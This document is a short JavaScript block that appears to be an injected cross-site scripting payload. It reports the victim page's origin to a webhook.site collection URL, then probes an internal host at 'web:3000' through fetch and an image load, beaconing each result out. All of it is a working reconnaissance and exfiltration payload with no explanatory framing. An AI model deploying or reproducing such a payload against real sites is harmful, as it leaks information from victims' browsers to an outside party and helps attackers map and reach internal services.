<script>
const webhook =
  "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";

function report(name, value) {
  const params = new URLSearchParams({
    event: name,
    value: String(value),
    time: new Date().toISOString()
  });
  new Image().src = webhook + "?" + params;
}

report("js-started", location.origin);

fetch("http://web:3000/", {
  mode: "cors",
  credentials: "omit"
})
.then(async response => {
  report("internal-fetch", response.status);
})
.catch(error => {
  report("internal-fetch-error", error.name);
});

const img = new Image();
img.onload = () => report("internal-image", "loaded");
img.onerror = () => report("internal-image", "failed");
img.src = "http://web:3000/favicon.ico";
</script>
